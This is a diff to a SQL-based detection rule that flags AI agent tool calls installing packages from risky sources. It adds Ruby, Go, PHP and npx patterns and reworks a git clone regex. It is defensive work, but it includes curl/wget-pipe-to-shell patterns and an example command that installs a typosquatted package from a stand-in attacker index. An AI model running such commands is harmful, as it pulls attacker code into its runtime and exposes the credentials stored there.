@@ -1,6 +1,6 @@
 id: rp-004
 name: "Supply Chain Watch"
-version: "1.2.0"
+version: "1.3.0"
 description: >
   Monitors agent tool invocations for package installation commands that could
   introduce malicious dependencies into the agent's runtime environment. v1.1.0
@@ -10,11 +10,17 @@ description: >
   wget-pipe-sh, uv/pipx/poetry package managers, and Docker image pulls from
   unverified registries. Reduces fp_rate from high to medium by combining install
   commands with suspicious source indicators.
+  v1.3.0 adds: gem install, go install, composer require (Ruby/Go/PHP package managers);
+  npx scoped-package install (@scope/pkg) — used by LLM coding agents installing npm tools;
+  Sigilsec 2026 "State of AI Agent Supply Chain Security" documents agents installing MCP
+  servers from Discord/GitHub with minimal vetting (12 GitHub stars, no review).
+  RE2 FIX: git clone negative lookahead (?!...) → NOT LIKE conditions (RE2 unsupported).
   References: OWASP LLM05:2025 (Supply Chain), LiteLLM PyPI compromise Mar 2026 -
   https://dev.to/deeptishuklatfy/your-ai-gateway-just-became-an-attack-vector-anatomy-of-the-litellm-supply-chain-compromise-1g7m,
   https://dev.to/precogs_ai/litellm-hit-by-credential-stealing-supply-chain-attack-complete-technical-breakdown-4550,
+  https://www.cremit.io/blog/ai-supply-chain-attack-clinejection,
+  https://agentfred.ai/blog/litellm-supply-chain-attack,
   Example: tool_input="pip install litellm-callbacks --extra-index-url https://pypi.attacker.com/simple/" (typosquat package via alternate index — LiteLLM attack vector)
-  https://www.cremit.io/blog/ai-supply-chain-attack-clinejection
 severity: warning
 category: supply_chain_compromise
 fp_rate: medium
@@ -27,6 +33,16 @@ tags:
   - package-install
   - owasp-llm05
 query_sql: |
+  -- Changelog v1.3.0 (2026-04-19):
+  -- CRITICAL FIX: git clone lookahead (?!github.com|...) used PCRE negative lookahead
+  --   which is NOT supported in RE2/Timeplus. Replaced with:
+  --   match(..., 'git\s+clone\s+https?://[a-z0-9]') AND NOT LIKE '%github.com%'
+  --   AND NOT LIKE '%gitlab.com%' AND NOT LIKE '%bitbucket.org%' AND NOT LIKE '%codeberg.org%'
+  -- ADDED: gem install (Ruby), go install (Go), composer require (PHP) — all used by
+  --   coding agents; MCP server installs via these ecosystems documented in Sigilsec 2026.
+  -- ADDED: npx @scope/pkg pattern — LLM coding agents install scoped npm packages via npx;
+  --   non-standard @scope/ (not @modelcontextprotocol/, @anthropic-ai/, etc.) is suspicious.
+  -- REFERENCES: Added agentfred.ai LiteLLM attack writeup.
   -- Changelog v1.1.0 (2026-04-16):
   -- Added uv, pipx, poetry, pnpm package managers.
   -- Added curl-pipe-bash / wget-pipe-sh (direct script execution).
@@ -59,18 +75,32 @@ query_sql: |
       OR lower(tool_input) LIKE '%cargo install%'
       OR lower(tool_input) LIKE '%apt-get install%'
       OR lower(tool_input) LIKE '%brew install%'
-      -- Additional package managers (new)
+      -- Additional package managers (v1.1.0)
       OR lower(tool_input) LIKE '%uv add%'
       OR lower(tool_input) LIKE '%pipx install%'
       OR lower(tool_input) LIKE '%poetry add%'
       OR lower(tool_input) LIKE '%pnpm add%'
-      -- Direct script execution via curl/wget pipe (new — high risk)
-      OR match(lower(tool_input), '\bcurl\b.{0,100}\|\s*(ba)?sh\b')
-      OR match(lower(tool_input), '\bwget\b.{0,100}\|\s*(ba)?sh\b')
-      -- pip with alternate index (typosquatting vector — LiteLLM attack)
-      OR match(lower(tool_input), '\bpip\s+install\b.{0,100}--(?:extra-)?index-url\b')
-      -- git clone from non-standard host (not github/gitlab/bitbucket)
-      OR match(lower(tool_input), '\bgit\s+clone\b.{0,200}https?://(?!github\.com|gitlab\.com|bitbucket\.org)')
-      -- docker pull from non-docker-hub registry
-      OR match(lower(tool_input), '\bdocker\s+pull\b.{0,100}/[a-z0-9\-]+:[a-z0-9\.\-]+')
+      -- Additional package managers (v1.3.0): Ruby, Go, PHP
+      OR match(lower(tool_input), 'gem\s+install\s+')
+      OR match(lower(tool_input), 'go\s+install\s+')
+      OR match(lower(tool_input), 'composer\s+require\s+')
+      -- npx scoped package install (v1.3.0) — coding agents installing MCP tools
+      -- Pattern: npx @scope/pkg (any scope) in tool_input for shell/bash tools
+      OR match(lower(tool_input), 'npx\s+[^@\s]*@[a-z0-9][a-z0-9\-]+')
+      -- Direct script execution via curl/wget pipe (v1.1.0 — high risk)
+      OR match(lower(tool_input), 'curl.{0,100}\|\s*(ba)?sh')
+      OR match(lower(tool_input), 'wget.{0,100}\|\s*(ba)?sh')
+      -- pip with alternate index (typosquatting vector — LiteLLM attack, v1.1.0)
+      OR match(lower(tool_input), 'pip\s+install.{0,100}--(?:extra-)?index-url')
+      -- git clone from non-standard host (v1.1.0, RE2-fixed v1.3.0)
+      -- RE2 does not support (?!...) lookahead; use NOT LIKE for trusted host exclusion
+      OR (
+        match(lower(tool_input), 'git\s+clone\s+https?://[a-z0-9]')
+        AND lower(tool_input) NOT LIKE '%github.com%'
+        AND lower(tool_input) NOT LIKE '%gitlab.com%'
+        AND lower(tool_input) NOT LIKE '%bitbucket.org%'
+        AND lower(tool_input) NOT LIKE '%codeberg.org%'
+      )
+      -- docker pull from non-standard registry (v1.1.0)
+      OR match(lower(tool_input), 'docker\s+pull\s+[a-z0-9][a-z0-9.\-]*/[a-z0-9\-]+:[a-z0-9.\-]+')
     )
